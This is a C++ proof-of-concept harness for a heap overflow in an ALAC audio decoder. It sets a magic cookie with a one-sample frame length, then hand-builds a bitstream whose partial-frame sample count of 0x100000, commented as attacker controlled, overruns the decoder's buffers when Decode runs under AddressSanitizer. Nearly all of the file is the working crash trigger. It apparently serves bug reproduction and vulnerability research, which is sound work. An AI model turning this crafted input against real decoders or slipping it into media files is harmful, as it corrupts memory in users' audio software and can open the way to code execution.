// PoC harness: ALAC partial-frame numSamples vs frameLength heap overflow
// Build: g++ -fsanitize=address,undefined -g -I codec harness_overflow.cpp \
//        codec/ALACDecoder.cpp codec/ag_dec.c codec/dp_dec.c codec/matrix_dec.c \
//        codec/ALACBitUtilities.c codec/EndianPortable.c -o harness_overflow
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <stdint.h>
#include "ALACDecoder.h"
#include "ALACBitUtilities.h"

int main() {
    // ---- magic cookie: frameLength = 1 (tiny internal buffers), 16-bit mono ----
    uint8_t cookie[24];
    memset(cookie, 0, sizeof(cookie));
    cookie[0] = 0x00; cookie[1] = 0x00; cookie[2] = 0x00; cookie[3] = 0x01; // frameLength = 1
    cookie[4] = 0x00;                                                       // compatibleVersion = 0
    cookie[5] = 16;                                                         // bitDepth = 16
    cookie[6] = 40;                                                         // pb
    cookie[7] = 10;                                                         // mb
    cookie[8] = 14;                                                         // kb
    cookie[9] = 1;                                                          // numChannels = 1
    cookie[10] = 0xFF; cookie[11] = 0xFF;                                   // maxRun
    cookie[12] = 0x00; cookie[13] = 0x00; cookie[14] = 0x00; cookie[15] = 0x20; // maxFrameBytes
    cookie[16] = 0x00; cookie[17] = 0x00; cookie[18] = 0x00; cookie[19] = 0x00; // avgBitRate
    cookie[20] = 0x00; cookie[21] = 0x00; cookie[22] = 0xAC; cookie[23] = 0x44; // sampleRate 44100

    ALACDecoder dec;
    int r = dec.Init(cookie, sizeof(cookie));
    printf("Init returned %d (mMixBufferU size = frameLength=%u int32s)\n", r, dec.mConfig.frameLength);
    if (r != 0) return 1;

    // ---- crafted bitstream: SCE element, partialFrame=1, escape=1, numSamples = 0x00100000 ----
    uint8_t stream[65536];
    memset(stream, 0, sizeof(stream));
    BitBuffer bb;
    BitBufferInit(&bb, stream, sizeof(stream));
    BitBufferWrite(&bb, 0, 3);                    // tag = ID_SCE
    BitBufferWrite(&bb, 0, 4);                    // element instance tag
    BitBufferWrite(&bb, 0, 12);                   // 12 unused header bits
    BitBufferWrite(&bb, 0b1001, 4);               // partialFrame=1, bytesShifted=00, escapeFlag=1
    BitBufferWrite(&bb, 0x00100000u, 32);         // numSamples = 1,048,576 (attacker controlled)
    // uncompressed path: chanBits=16 samples follow (zeros here)

    uint8_t *sampleBuffer = (uint8_t *)calloc(4096, 2);   // caller's output buffer, 4096 frames
    uint32_t outNum = 0;
    // reset the bit buffer to the START of the crafted stream (reader position)
    BitBuffer rb;
    BitBufferInit(&rb, stream, sizeof(stream));
    printf("Decoding with caller numSamples=4096, stream overrides to 0x100000...\n");
    fflush(stdout);
    r = dec.Decode(&rb, sampleBuffer, 4096, 1, &outNum);
    printf("Decode returned %d, outNumSamples=%u\n", r, outNum);
    free(sampleBuffer);
    return 0;
}
